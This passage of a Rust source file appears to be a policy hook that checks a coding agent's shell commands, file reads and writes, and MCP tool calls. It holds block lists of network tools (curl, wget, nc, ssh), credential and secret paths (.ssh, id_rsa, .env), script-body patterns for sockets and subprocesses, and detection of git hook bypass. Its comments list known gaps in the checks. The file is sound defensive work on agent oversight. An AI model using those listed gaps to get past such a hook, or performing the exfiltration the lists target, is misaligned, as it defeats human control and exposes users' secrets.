// SPDX-FileCopyrightText: Copyright (c) 2026 Oliver Klug
// SPDX-License-Identifier: Apache-2.0

use crate::{
    append_decision, append_tags_maybe_parent, bind_pending_child, cedar_provenance, child_open,
    child_stop, classify_after_mcp, classify_after_shell, conversation_id_from_stdin,
    hop_secret_tags, load_lines, load_session, observe_path, reduce, session_dir, sha256_hex,
    spawn_id_from_stdin, workspace_key, Decision, DecisionRequest, Engine, SessionFacts,
};
use serde_json::{json, Value};
use std::fs::{self, File, OpenOptions};
use std::io::{Read, Write};
use std::panic::{self, AssertUnwindSafe};
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

const BORING: &[&str] = &[
    // python/python3/node stay boring. Deny comes from argv paths / script scan / --no-verify, not Ask.
    "ls", "rg", "grep", "git", "pytest", "python", "python3", "npm", "npx", "cargo", "go", "tsc",
    "node",
];
const NET_BIN: &[&str] = &["curl", "wget", "nc", "ssh", "scp"];
const SCRIPT_SCAN_MAX: usize = 256 * 1024;
const SYMLINK_MAX: u32 = 40;
const INTERPRETERS: &[&str] = &["python", "python3", "python2", "node"];
// ponytail: name list, not an importer. Ceiling: ruff/mypy until Safe Auto-run needs them.
const PY_M_ALLOW: &[&str] = &["pytest", "unittest", "doctest"];
const SCRIPT_EXT: &[&str] = &["py", "pyw", "js", "mjs", "cjs"];
const SHELL_RC: &[&str] = &[
    ".bashrc",
    ".zshrc",
    ".profile",
    ".zprofile",
    ".bash_profile",
];
const MCP_WRITE: &[&str] = &["write", "create", "update", "delete", "push", "send"];

pub const CONTEXT_KEYS: &[&str] = &[
    "command",
    "cwd",
    "sandbox",
    "argv0",
    "argv0_is_boring",
    "command_looks_like_network",
    "path_is_sensitive",
    "mcp_is_write",
    "tool_name",
    "provenance",
    "granted_caps",
    "parent_caps",
    "session",
];
pub const SESSION_KEYS: &[&str] = &[
    "touched_secrets",
    "saw_untrusted_web",
    "saw_mcp_untrusted",
    "subagent_active",
    "secret_read_count",
];

pub fn mint_session_id() -> String {
    let mut b = [0u8; 16];
    let _ = getrandom::getrandom(&mut b);
    crate::to_hex(&b)
}

pub fn argv0(command: &str) -> String {
    posix_split(command)
        .into_iter()
        .next()
        .unwrap_or_default()
}

struct PosixSplit {
    tokens: Vec<String>,
    has_param_expansion: bool,
    unmatched: bool,
}

fn dollar_starts_param_expansion(next: Option<char>) -> bool {
    match next {
        Some('{') => true,
        Some('(' | '\'') => false,
        Some(c) if c.is_ascii_alphanumeric() || c == '_' => true,
        Some('@' | '*' | '#' | '?' | '!' | '-' | '$') => true,
        _ => false,
    }
}

/// POSIX quote-aware split plus bash `$''` ANSI-C in the unquoted arm.
/// ponytail: wrappers / bash -c still miss F-DEF-06 identity (argv0 not boring = default deny).
/// Upgrade: S1 tree-sitter-bash when a fixture of that form must Deny. Not this slice.
fn posix_split(command: &str) -> Vec<String> {
    posix_split_ex(command).tokens
}

fn posix_split_ex(command: &str) -> PosixSplit {
    let mut tokens = Vec::new();
    let mut cur = String::new();
    let mut chars = command.chars().peekable();
    let mut in_single = false;
    let mut in_double = false;
    let mut unmatched_ansi = false;
    let mut has_param_expansion = false;
    while let Some(c) = chars.next() {
        if in_single {
            if c == '\'' {
                in_single = false;
            } else {
                cur.push(c);
            }
            continue;
        }
        if in_double {
            if c == '"' {
                in_double = false;
            } else if c == '\\' {
                match chars.peek() {
                    Some(&'"' | &'\\' | &'$' | &'`') => cur.push(chars.next().expect("peek")),
                    Some(&'\n') => {
                        chars.next();
                    }
                    _ => cur.push(c),
                }
            } else if c == '$' {
                // ponytail: do not exec $VAR. Fail closed on double-quoted $ident / ${...}.
                // \$ already skipped above. $( is looks_like_substitution.
                if dollar_starts_param_expansion(chars.peek().copied()) {
                    has_param_expansion = true;
                }
                cur.push('$');
            } else {
                cur.push(c);
            }
            continue;
        }
        match c {
            '\'' => in_single = true,
            '"' => in_double = true,
            '\\' => {
                if let Some(n) = chars.next() {
                    cur.push(n);
                }
            }
            '$' if chars.peek() == Some(&'\'') => {
                chars.next();
                let mut inner = String::new();
                let mut closed = false;
                while let Some(ch) = chars.next() {
                    if ch == '\\' {
                        inner.push('\\');
                        if let Some(n) = chars.next() {
                            inner.push(n);
                        }
                        continue;
                    }
                    if ch == '\'' {
                        closed = true;
                        break;
                    }
                    inner.push(ch);
                }
                if !closed {
                    unmatched_ansi = true;
                    break;
                }
                cur.push_str(&unescape_ansi_c(&inner));
            }
            '$' => {
                // ponytail: PATH=$PATH git status also Denies. Upgrade: skip env-assign
                // tokens if a fixture must Allow.
                if dollar_starts_param_expansion(chars.peek().copied()) {
                    has_param_expansion = true;
                }
                cur.push('$');
            }
            c if c.is_whitespace() => {
                if !cur.is_empty() {
                    tokens.push(std::mem::take(&mut cur));
                }
            }
            _ => cur.push(c),
        }
    }
    if in_single || in_double || unmatched_ansi {
        return PosixSplit {
            tokens: command.split_whitespace().map(str::to_string).collect(),
            has_param_expansion,
            unmatched: true,
        };
    }
    if !cur.is_empty() {
        tokens.push(cur);
    }
    PosixSplit {
        tokens,
        has_param_expansion,
        unmatched: false,
    }
}

fn take_hex(bytes: &[u8], max: usize) -> (u32, usize) {
    let mut n = 0u32;
    let mut i = 0;
    while i < bytes.len() && i < max {
        let d = match bytes[i] {
            b'0'..=b'9' => bytes[i] - b'0',
            b'a'..=b'f' => bytes[i] - b'a' + 10,
            b'A'..=b'F' => bytes[i] - b'A' + 10,
            _ => break,
        };
        n = (n << 4) | u32::from(d);
        i += 1;
    }
    (n, i)
}

fn push_utf8_scalar(out: &mut Vec<u8>, n: u32) {
    match char::from_u32(n) {
        Some(ch) => out.extend_from_slice(ch.encode_utf8(&mut [0; 4]).as_bytes()),
        None => out.extend_from_slice(char::REPLACEMENT_CHARACTER.encode_utf8(&mut [0; 4]).as_bytes()),
    }
}

fn unescape_ansi_c(inner: &str) -> String {
    let bytes = inner.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] != b'\\' {
            out.push(bytes[i]);
            i += 1;
            continue;
        }
        i += 1;
        if i >= bytes.len() {
            out.push(b'\\');
            break;
        }
        match bytes[i] {
            b'\\' => {
                out.push(b'\\');
                i += 1;
            }
            b'\'' => {
                out.push(b'\'');
                i += 1;
            }
            b'"' => {
                out.push(b'"');
                i += 1;
            }
            b'?' => {
                out.push(b'?');
                i += 1;
            }
            b'a' => {
                out.push(0x07);
                i += 1;
            }
            b'b' => {
                out.push(0x08);
                i += 1;
            }
            b'e' | b'E' => {
                out.push(0x1b);
                i += 1;
            }
            b'f' => {
                out.push(0x0c);
                i += 1;
            }
            b'n' => {
                out.push(b'\n');
                i += 1;
            }
            b'r' => {
                out.push(b'\r');
                i += 1;
            }
            b't' => {
                out.push(b'\t');
                i += 1;
            }
            b'v' => {
                out.push(0x0b);
                i += 1;
            }
            b'x' => {
                i += 1;
                let (n, consumed) = take_hex(&bytes[i..], 2);
                if consumed == 0 {
                    out.push(b'\\');
                    out.push(b'x');
                } else if n == 0 {
                    break;
                } else {
                    out.push(n as u8);
                    i += consumed;
                }
            }
            b'u' => {
                i += 1;
                let (n, consumed) = take_hex(&bytes[i..], 4);
                if consumed == 0 {
                    out.push(b'\\');
                    out.push(b'u');
                } else {
                    push_utf8_scalar(&mut out, n);
                    i += consumed;
                }
            }
            b'U' => {
                i += 1;
                let (n, consumed) = take_hex(&bytes[i..], 8);
                if consumed == 0 {
                    out.push(b'\\');
                    out.push(b'U');
                } else {
                    push_utf8_scalar(&mut out, n);
                    i += consumed;
                }
            }
            b'c' => {
                i += 1;
                if i >= bytes.len() {
                    out.push(b'\\');
                    out.push(b'c');
                    break;
                }
                let x = bytes[i];
                i += 1;
                if x == b'?' {
                    out.push(0x7f);
                } else {
                    out.push(x & 0x1f);
                }
            }
            b'0'..=b'7' => {
                let mut n = 0u32;
                let mut k = 0;
                while i < bytes.len() && k < 3 && (b'0'..=b'7').contains(&bytes[i]) {
                    n = (n << 3) | u32::from(bytes[i] - b'0');
                    i += 1;
                    k += 1;
                }
                out.push((n % 256) as u8);
                if n % 256 == 0 {
                    break;
                }
            }
            other => {
                out.push(b'\\');
                out.push(other);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn is_flag_token(tok: &str) -> bool {
    tok == "--" || (tok.starts_with('-') && tok != "-")
}

fn looks_like_env_assign(tok: &str) -> bool {
    let Some((k, _)) = tok.split_once('=') else {
        return false;
    };
    let mut chars = k.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn git_config_writes_hookspath(parts: &[String]) -> bool {
    let has_config = parts.iter().any(|t| t.eq_ignore_ascii_case("config"));
    let has_key = parts
        .iter()
        .any(|t| t.to_ascii_lowercase().contains("hookspath"));
    if !has_config || !has_key {
        return false;
    }
    !parts.iter().any(|t| {
        matches!(
            t.as_str(),
            "--get" | "--get-all" | "--get-regexp" | "--list" | "--show-origin"
        )
    })
}

fn git_commit_dash_n(parts: &[String]) -> bool {
    let Some(i) = parts.iter().position(|t| !looks_like_env_assign(t)) else {
        return false;
    };
    if basename(&parts[i]) != "git" {
        return false;
    }
    let rest = &parts[i + 1..];
    if !rest.iter().any(|t| t == "commit" && !is_flag_token(t)) {
        return false;
    }
    rest.iter().any(|t| is_short_n_flag(t))
}

fn is_short_n_flag(tok: &str) -> bool {
    if !tok.starts_with('-') || tok.starts_with("--") {
        return false;
    }
    tok.as_bytes().iter().skip(1).any(|b| *b == b'n')
}

fn looks_like_substitution(command: &str) -> bool {
    // ponytail: do not exec $(...) / backticks. Fail closed on the syntax.
    // Upgrade: S1 dynamic-word → ok:false when a fixture needs quoted $( to Allow.
    command.contains("$(") || command.contains('`')
}

fn git_skips_hooks(command: &str) -> bool {
    // ponytail: not a path. F-DEF-01 forbids Shell when path_is_sensitive.
    // Scan decoded tokens so $'\x3d' cannot hide hooksPath=.
    // Upgrade: F-DEF-09 + S1 git:--no-verify.
    let parts = posix_split(command);
    let Some(a0) = parts.iter().find(|t| !looks_like_env_assign(t)) else {
        return false;
    };
    if basename(a0) != "git" {
        return false;
    }
    if parts.iter().any(|t| t.contains("--no-verify")) {
        return true;
    }
    if git_commit_dash_n(&parts) {
        return true;
    }
    if parts
        .iter()
        .any(|t| t.to_ascii_lowercase().contains("hookspath="))
    {
        return true;
    }
    git_config_writes_hookspath(&parts)
}

fn basename(token: &str) -> &str {
    Path::new(token)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(token)
}

// python3.12 / python3.13: same family as python3. Do not glob python3* (python3-config).
fn is_versioned_python3(a0: &str) -> bool {
    a0.strip_prefix("python3.")
        .and_then(|rest| rest.as_bytes().first())
        .is_some_and(u8::is_ascii_digit)
}

fn tokens(command: &str) -> impl Iterator<Item = &str> {
    command.split(|c: char| c.is_whitespace() || c == '|' || c == '&')
}

pub fn argv0_is_boring(command: &str) -> bool {
    let a0_owned = argv0(command);
    let a0 = basename(&a0_owned);
    (BORING.iter().any(|b| *b == a0) || is_versioned_python3(a0))
        && !command.contains("&&")
        && !command.contains('|')
        && !tokens(command).any(|t| NET_BIN.iter().any(|n| *n == basename(t)))
}

pub fn command_looks_like_network(command: &str) -> bool {
    tokens(command).any(|t| NET_BIN.iter().any(|n| *n == basename(t)))
        || command.contains("://")
        || looks_like_loopback(command)
}

fn looks_like_loopback(s: &str) -> bool {
    let n = s.to_ascii_lowercase();
    n.contains("127.0.0.1")
        || n.contains("0.0.0.0")
        || n.contains("[::1]")
        || n.contains("localhost")
}

fn command_looks_like_write(s: &str) -> bool {
    // ponytail: `>` is coarse (rg ">" .git/hooks false-positive). Ceiling: sh AST redirects.
    s.contains('>')
        || s.contains("tee ")
        || s.contains("open(")
        || s.contains(".write(")
        || s.contains("write_text")
        || s.contains("write_bytes")
        || s.contains("Path(")
}

fn flatten_scan(command: &str, tool_input: Option<&Value>) -> String {
    match tool_input {
        None | Some(Value::Null) => command.to_string(),
        Some(Value::String(s)) => format!("{command}\n{s}"),
        Some(v) => format!("{command}\n{v}"),
    }
}

fn expand_tilde(path: &str) -> String {
    if let Some(rest) = path.strip_prefix("~/") {
        if let Ok(home) = std::env::var("HOME") {
            return format!("{home}/{rest}");
        }
    }
    if path == "~" {
        if let Ok(home) = std::env::var("HOME") {
            return home;
        }
    }
    path.to_string()
}

enum PathScan {
    Named(String),
    OpaqueSymlink,
}

fn slash_norm(p: &Path) -> String {
    p.to_string_lossy().replace('\\', "/")
}

fn join_cwd(path: &str, cwd: &str) -> PathBuf {
    let expanded = expand_tilde(path);
    let p = Path::new(&expanded);
    if p.is_absolute() {
        p.to_path_buf()
    } else if cwd.is_empty() {
        p.to_path_buf()
    } else {
        Path::new(cwd).join(p)
    }
}

fn follow_dangling(start: &Path, depth: u32) -> Option<PathScan> {
    let meta = fs::symlink_metadata(start).ok()?;
    if !meta.file_type().is_symlink() {
        return None;
    }
    if depth >= SYMLINK_MAX {
        return Some(PathScan::OpaqueSymlink);
    }
    let target = match fs::read_link(start) {
        Ok(t) => t,
        Err(_) => return Some(PathScan::OpaqueSymlink),
    };
    let next = if target.is_absolute() {
        target
    } else {
        match start.parent() {
            Some(p) => p.join(target),
            None => target,
        }
    };
    if let Ok(canon) = fs::canonicalize(&next) {
        return Some(PathScan::Named(slash_norm(&canon)));
    }
    match follow_dangling(&next, depth + 1) {
        Some(scan) => Some(scan),
        None => Some(PathScan::Named(slash_norm(&next))),
    }
}

fn resolve_for_scan(path: &str, cwd: &str) -> PathScan {
    // ponytail: canonicalize / read_link at hook time. Cursor Write/Read open later.
    // O_NOFOLLOW on inspect_script is the wrong fd. Upgrade: host sandbox.
    if path.is_empty() {
        return PathScan::Named(String::new());
    }
    let joined = join_cwd(path, cwd);
    if let Ok(canon) = fs::canonicalize(&joined) {
        return PathScan::Named(slash_norm(&canon));
    }
    match follow_dangling(&joined, 0) {
        Some(scan) => scan,
        None => {
            if let Some(parent) = joined.parent() {
                if let Ok(pc) = fs::canonicalize(parent) {
                    let name = joined.file_name().unwrap_or_default();
                    return PathScan::Named(slash_norm(&pc.join(name)));
                }
            }
            PathScan::Named(slash_norm(&joined))
        }
    }
}

fn path_sensitive_resolved(path: &str, cwd: &str) -> bool {
    if path_is_sensitive(path) {
        return true;
    }
    match resolve_for_scan(path, cwd) {
        PathScan::OpaqueSymlink => true,
        PathScan::Named(p) => path_is_sensitive(&p),
    }
}

pub fn path_is_sensitive(path: &str) -> bool {
    if path.is_empty() {
        return false;
    }
    let n = expand_tilde(path).replace('\\', "/");
    let lower = n.to_ascii_lowercase();
    let file = n.rsplit('/').next().unwrap_or(n.as_str());
    let file_l = file.to_ascii_lowercase();

    if n.contains(".git/hooks") || n.contains(".git/config") {
        return true;
    }
    if n.contains(".cursor/mcp.json") || (n.contains("/.cursor/") && file == "mcp.json") {
        return true;
    }
    if SHELL_RC.iter().any(|r| *r == file) {
        return true;
    }
    if file == ".env" {
        return true;
    }
    // TCB files: the pin, the signing seed, the hooks file, and the policy pack.
    if matches!(
        file_l.as_str(),
        "last-armed.json"
            | "ed25519.seed"
            | "hooks.json"
            | "baseline.cedar"
            | "coding-agent.cedarschema"
    ) {
        return true;
    }
    if file_l.ends_with(".pem") {
        return true;
    }
    if lower.contains("credentials") {
        return true;
    }
    if file == "id_rsa" || file == "id_ed25519" || file_l.ends_with(".ppk") {
        return true;
    }
    if n.contains("/.ssh/") || n.contains(".ssh/") || n.ends_with("/.ssh") {
        return true;
    }
    if n.contains("/fairlead/sessions/") || n.contains("/.local/state/fairlead/") {
        return true;
    }
    if let Ok(dir) = std::env::var("FAIRLEAD_SESSION_DIR") {
        let d = expand_tilde(&dir).replace('\\', "/");
        let d = d.trim_end_matches('/');
        if !d.is_empty() && (n == d || n.starts_with(&format!("{d}/"))) {
            return true;
        }
    }
    false
}

pub fn mcp_is_write(tool_name: &str) -> bool {
    let t = tool_name.to_ascii_lowercase();
    MCP_WRITE.iter().any(|k| t.contains(k))
}

fn is_script_path(tok: &str) -> bool {
    Path::new(tok)
        .extension()
        .and_then(|s| s.to_str())
        .map(|e| SCRIPT_EXT.iter().any(|x| *x == e))
        .unwrap_or(false)
}

fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// ASCII identifier boundary. Needles are ASCII, so a byte scan cannot split a char.
/// ponytail: not a parser. Ceiling: `print("nc")` still hits; `"n"+"c"` and `ncat` do not.
fn contains_ident(body: &str, needle: &str) -> bool {
    let hay = body.as_bytes();
    let n = needle.as_bytes();
    if n.is_empty() || n.len() > hay.len() {
        return false;
    }
    let last = hay.len() - n.len();
    let mut i = 0;
    while i <= last {
        if &hay[i..i + n.len()] == n {
            let before = i == 0 || !is_ident_byte(hay[i - 1]);
            let after_at = i + n.len();
            let after = after_at == hay.len() || !is_ident_byte(hay[after_at]);
            if before && after {
                return true;
            }
        }
        i += 1;
    }
    false
}

/// `os.execl` / `os.execv` and their p/e variants. Not `os.executable`.
fn contains_os_exec(body: &str) -> bool {
    let hay = body.as_bytes();
    let n = b"os.exec";
    if n.len() > hay.len() {
        return false;
    }
    let last = hay.len() - n.len();
    let mut i = 0;
    while i <= last {
        if &hay[i..i + n.len()] == n {
            let before = i == 0 || !is_ident_byte(hay[i - 1]);
            let after = i + n.len();
            if before && after < hay.len() && (hay[after] == b'l' || hay[after] == b'v') {
                return true;
            }
        }
        i += 1;
    }
    false
}

// ponytail: name list, not a JS parser. Ceiling: next GTFOBins module
// (dgram, fs write of .ssh) is a list add when a fixture of that form must Deny.
// Unnamed extras: http['createServer'](), dgram.createSocket.
// curl/wget/nc are identifier-bounded. `.encode` is not `nc`. A comment that
// says nc next to subprocess still denies. A .sh body is not in SCRIPT_EXT.
// os.system / subprocess.run still set command_looks_like_network (F-DEF-03).
// python/node script, -c, and -e are F-DEF-09, so getattr, a swapped clean.py,
// and a child whose text is not in the parent are not an allow.
// argv0 pytest and python -m pytest/unittest/doctest are F-DEF-09. The runner
// is not an allow. npm, npx, cargo, and go stay boring and still run repository
// code. tsc stays boring and does not run the program.
fn script_body_hits(body: &str) -> bool {
    if body.contains("urllib")
        || body.contains("http.client")
        || body.contains("http.server")
        || body.contains("xmlrpc.server")
        || body.contains("xmlrpc.client")
        || body.contains("wsgiref.simple_server")
        || body.contains("socketserver")
        || body.contains("httpx")
        || body.contains("aiohttp")
        || body.contains("requests.")
        || body.contains("import socket")
        || body.contains("socket.socket")
        || body.contains("socket.create_connection")
        || body.contains(".env")
        || body.contains("os.environ")
        || body.contains("require('http")
        || body.contains("require(\"http")
        || body.contains("require('net")
        || body.contains("require(\"net")
        || body.contains("node:http")
        || body.contains("node:https")
        || body.contains("node:net")
        || body.contains("fetch(")
        || body.contains("axios.")
        || body.contains("child_process")
        || contains_ident(body, "os.system")
        || contains_ident(body, "os.popen")
        || contains_ident(body, "os.spawn")
        || contains_os_exec(body)
        || contains_ident(body, "subprocess.run")
        || contains_ident(body, "subprocess.call")
        || contains_ident(body, "subprocess.Popen")
        || contains_ident(body, "subprocess.check_output")
        || contains_ident(body, "subprocess.check_call")
        || body.contains("http.createServer")
        || body.contains("net.createServer")
        || body.contains("https.createServer")
        || body.contains("tls.createServer")
        || body.contains("http2.createServer")
        || body.contains("http2.createSecureServer")
    {
        return true;
    }
    if body.contains("subprocess")
        && (contains_ident(body, "curl")
            || contains_ident(body, "wget")
            || contains_ident(body, "nc"))
    {
        return true;
    }
    body.contains("open(") && path_is_sensitive(body)
}

enum ScriptInspect {
    Skip,
    Deny,
    Clean,
}

fn glued_m_module(t: &str) -> Option<&str> {
    let rest = t.strip_prefix("-m")?;
    if rest.is_empty() || rest.starts_with('-') {
        None
    } else {
        Some(rest)
    }
}

fn token_is_dash_m(t: &str) -> bool {
    t == "-m" || glued_m_module(t).is_some()
}

// ponytail: Node eval-flag names, not an argv parser. Ceiling: next Safe Auto-run
// basename (nodejs) is a list add on BORING and INTERPRETERS together;
// leftovers: --import / NODE_OPTIONS / host-stdin-not-in-argv;
// clustered shorts other than -pe/-ep are a list add.
// Do not parse V8 flags. -e=code is not a Node alias for --eval=.
fn glued_node_eval(t: &str) -> Option<&str> {
    t.strip_prefix("--eval=")
        .or_else(|| t.strip_prefix("--print="))
}

fn glued_node_require(t: &str) -> Option<&str> {
    if let Some(rest) = t.strip_prefix("--require=") {
        return Some(rest);
    }
    if let Some(rest) = t.strip_prefix("-r=") {
        if rest.is_empty() || rest.starts_with('-') {
            None
        } else {
            Some(rest)
        }
    } else {
        let rest = t.strip_prefix("-r")?;
        if rest.is_empty() || rest.starts_with('-') {
            None
        } else {
            Some(rest)
        }
    }
}

fn token_is_dash_r(t: &str) -> bool {
    t == "-r" || t == "--require" || glued_node_require(t).is_some()
}

fn require_is_path_like(spec: &str) -> bool {
    spec.starts_with('/') || spec.starts_with("./") || spec.starts_with("../") || spec.starts_with('~')
}

fn node_takes_eval_operand(t: &str) -> bool {
    matches!(t, "-e" | "--eval" | "-p" | "--print" | "-pe" | "-ep")
}

fn is_inline_eval(a0: &str, t: &str) -> bool {
    if a0 == "node" {
        node_takes_eval_operand(t) || glued_node_eval(t).is_some()
    } else {
        t == "-c"
    }
}

fn inspect_inline_body(body: &str) -> ScriptInspect {
    if body.len() > SCRIPT_SCAN_MAX {
        return ScriptInspect::Deny;
    }
    if script_body_hits(body) {
        ScriptInspect::Deny
    } else {
        ScriptInspect::Clean
    }
}

fn inspect_script_file(path: &str, cwd: &str) -> ScriptInspect {
    let named = match resolve_for_scan(path, cwd) {
        PathScan::OpaqueSymlink => return ScriptInspect::Deny,
        PathScan::Named(p) if p.is_empty() => return ScriptInspect::Deny,
        PathScan::Named(p) => p,
    };
    let file = match File::open(&named) {
        Ok(f) => f,
        Err(_) => return ScriptInspect::Deny,
    };
    let mut buf = Vec::new();
    match file.take(SCRIPT_SCAN_MAX as u64 + 1).read_to_end(&mut buf) {
        Err(_) => ScriptInspect::Deny,
        Ok(_) if buf.len() > SCRIPT_SCAN_MAX => ScriptInspect::Deny,
        Ok(_) => match std::str::from_utf8(&buf) {
            Err(_) => ScriptInspect::Deny,
            Ok(s) if script_body_hits(s) => ScriptInspect::Deny,
            Ok(_) => ScriptInspect::Clean,
        },
    }
}

// ponytail: require() split, not require.resolve. Path-like / cwd SCRIPT_EXT file
// is scanned; package names (ts-node/register) are specifier-string only.
// Ceiling: node_modules walk / --import when a fixture of that form must Deny.
fn inspect_require_spec(spec: &str, cwd: &str) -> ScriptInspect {
    if spec.is_empty() {
        return ScriptInspect::Deny;
    }
    if script_body_hits(spec) {
        return ScriptInspect::Deny;
    }
    if require_is_path_like(spec) {
        return inspect_script_file(spec, cwd);
    }
    if is_script_path(spec) && join_cwd(spec, cwd).is_file() {
        return inspect_script_file(spec, cwd);
    }
    ScriptInspect::Clean
}

fn classify_dash_m(modname: &str) -> ScriptInspect {
    if PY_M_ALLOW.iter().any(|a| *a == modname) {
        ScriptInspect::Clean
    } else {
        ScriptInspect::Deny
    }
}

/// python/python2/python3/python3.<digit>/node, including `-m`, plus argv0 pytest.
/// classify_dash_m still treats pytest/unittest/doctest as Clean so the sentence
/// is F-DEF-09, not F-DEF-03. npm, npx, cargo, and go stay boring and still run
/// repository code. tsc typechecks and does not run the program.
fn interpreter_exec(parts: &[String]) -> bool {
    let Some(a0) = parts.first().map(|s| basename(s)) else {
        return false;
    };
    a0 == "pytest" || INTERPRETERS.iter().any(|i| *i == a0) || is_versioned_python3(a0)
}

fn inspect_script(parts: &[String], cwd: &str, unmatched: bool) -> ScriptInspect {
    let Some(a0) = parts.first().map(|s| basename(s)) else {
        return ScriptInspect::Skip;
    };
    if !(INTERPRETERS.iter().any(|i| *i == a0) || is_versioned_python3(a0)) {
        return ScriptInspect::Skip;
    }
    if unmatched
        && parts.iter().any(|t| {
            is_inline_eval(a0, t) || token_is_dash_m(t) || (a0 == "node" && token_is_dash_r(t))
        })
    {
        return ScriptInspect::Deny;
    }
    let mut i = 1;
    while i < parts.len() {
        let t = &parts[i];
        if t == "-m" {
            let Some(modname) = parts.get(i + 1) else {
                return ScriptInspect::Deny;
            };
            return classify_dash_m(modname);
        }
        if let Some(modname) = glued_m_module(t) {
            return classify_dash_m(modname);
        }
        if a0 == "node" {
            if let Some(spec) = glued_node_require(t) {
                if spec.is_empty() {
                    return ScriptInspect::Deny;
                }
                match inspect_require_spec(spec, cwd) {
                    ScriptInspect::Deny => return ScriptInspect::Deny,
                    ScriptInspect::Skip | ScriptInspect::Clean => {
                        i += 1;
                        continue;
                    }
                }
            }
            if t == "-r" || t == "--require" {
                let Some(spec) = parts.get(i + 1) else {
                    return ScriptInspect::Deny;
                };
                match inspect_require_spec(spec, cwd) {
                    ScriptInspect::Deny => return ScriptInspect::Deny,
                    ScriptInspect::Skip | ScriptInspect::Clean => {
                        i += 2;
                        continue;
                    }
                }
            }
            if let Some(body) = glued_node_eval(t) {
                if body.is_empty() {
                    return ScriptInspect::Deny;
                }
                return inspect_inline_body(body);
            }
            if node_takes_eval_operand(t) {
                let Some(body) = parts.get(i + 1) else {
                    return ScriptInspect::Deny;
                };
                return inspect_inline_body(body);
            }
        } else if t == "-c" {
            let Some(body) = parts.get(i + 1) else {
                return ScriptInspect::Deny;
            };
            return inspect_inline_body(body);
        }
        if t == "-" {
            return ScriptInspect::Deny;
        }
        if is_flag_token(t) {
            i += 1;
            continue;
        }
        if is_script_path(t) {
            return inspect_script_file(t, cwd);
        }
        return ScriptInspect::Skip;
    }
    ScriptInspect::Skip
}

pub fn path_from_tool_input(v: &Value) -> String {
    match v {
        Value::String(s) => {
            if let Ok(inner) = serde_json::from_str::<Value>(s) {
                return path_from_tool_input(&inner);
            }
            s.clone()
        }
        Value::Object(m) => {
            for k in ["file_path", "path", "filePath", "target"] {
                if let Some(Value::String(s)) = m.get(k) {
                    return s.clone();
                }
            }
            String::new()
        }
        _ => String::new(),
    }
}

// ponytail: a Grep whose path and glob are not themselves sensitive still returns matching
// file contents (workspace-wide search). Cursor does not send the hit list. If it
// arrives as `files`, a sensitive entry denies. An omitted path stays allowed.
fn grep_subject_path(stdin: &Value, path: &str) -> String {
    if path_is_sensitive(path) {
        return path.to_string();
    }
    let Some(raw) = stdin.get("tool_input") else {
        return path.to_string();
    };
    if let Value::Object(m) = raw {
        return sensitive_in_grep_input(m).unwrap_or_else(|| path.to_string());
    }
    if let Value::String(s) = raw {
        if let Ok(Value::Object(m)) = serde_json::from_str::<Value>(s) {
            return sensitive_in_grep_input(&m).unwrap_or_else(|| path.to_string());
        }
    }
    path.to_string()
}

fn sensitive_in_grep_input(m: &serde_json::Map<String, Value>) -> Option<String> {
    if let Some(s) = m.get("glob").and_then(|v| v.as_str()) {
        if path_is_sensitive(s) {
            return Some(s.to_string());
        }
    }
    if let Some(hit) = sensitive_path_array(m, "path") {
        return Some(hit);
    }
    // Cursor does not send a hit list today. If one arrives as `files`, a
    // sensitive entry is the path. Absent key stays the caller's path.
    sensitive_path_array(m, "files")
}

fn sensitive_path_array(m: &serde_json::Map<String, Value>, key: &str) -> Option<String> {
    let arr = m.get(key)?.as_array()?;
    for v in arr {
        if let Some(s) = v.as_str() {
            if path_is_sensitive(s) {
                return Some(s.to_string());
            }
        }
    }
    None
}

/// Glob subject is the pattern, then the directory. `**/*` does not name
/// `.git/config`, and Cursor does not send the result list, so that pattern
/// stays an ordinary read.
fn glob_subject_path(stdin: &Value) -> String {
    let obj = match stdin.get("tool_input") {
        Some(Value::Object(m)) => m.clone(),
        Some(Value::String(s)) => match serde_json::from_str::<Value>(s) {
            Ok(Value::Object(m)) => m,
            _ => return String::new(),
        },
        _ => return String::new(),
    };
    for k in ["glob_pattern", "target_directory", "path"] {
        if let Some(s) = obj.get(k).and_then(|v| v.as_str()) {
            if !s.is_empty() {
                return s.to_string();
            }
        }
    }
    String::new()
}

fn body_from_tool_input(v: &Value) -> Option<String> {
    match v {
        Value::String(s) => {
            if let Ok(inner) = serde_json::from_str::<Value>(s) {
                return body_from_tool_input(&inner);
            }
            None
        }
        Value::Object(m) => m
            .get("contents")
            .and_then(|x| x.as_str())
            .or_else(|| m.get("content").and_then(|x| x.as_str()))
            .map(str::to_string)
            .or_else(|| m.get("tool_input").and_then(body_from_tool_input)),
        _ => None,
    }
}

// ponytail: FileWrite net is SCRIPT_EXT JSON body only. Do not OR
// looks_like_loopback(flatten_scan) or FileWrite of README + 127.0.0.1 Denies
// after F-DEF-03 includes FileWrite. Missing contents/content = Skip (Edit leftover).
// String tool_input is JSON-unwrapped like path_from_tool_input; non-JSON string is Skip.
fn filewrite_body_is_net(path: &str, input: &Value) -> bool {
    if !is_script_path(path) {
        return false;
    }
    let Some(body) = body_from_tool_input(input) else {
        return false;
    };
    matches!(inspect_inline_body(&body), ScriptInspect::Deny)
}

fn command_from_tool_input(v: &Value) -> String {
    match v {
        Value::String(s) => {
            if let Ok(inner) = serde_json::from_str::<Value>(s) {
                return command_from_tool_input(&inner);
            }
            s.clone()
        }
        Value::Object(m) => m
            .get("command")
            .and_then(|x| x.as_str())
            .unwrap_or("")
            .to_string(),
        _ => String::new(),
    }
}

pub fn filled_context(
    command: &str,
    cwd: &str,
    sandbox: bool,
    path: &str,
    tool_name: &str,
    granted_caps: &[String],
    parent_caps: &[String],
    facts: &SessionFacts,
    provenance: &[String],
) -> Value {
    filled_context_scan(
        command,
        command,
        cwd,
        sandbox,
        path,
        tool_name,
        granted_caps,
        parent_caps,
        facts,
        provenance,
    )
}

fn filled_context_scan(
    command: &str,
    scan: &str,
    cwd: &str,
    sandbox: bool,
    path: &str,
    tool_name: &str,
    granted_caps: &[String],
    parent_caps: &[String],
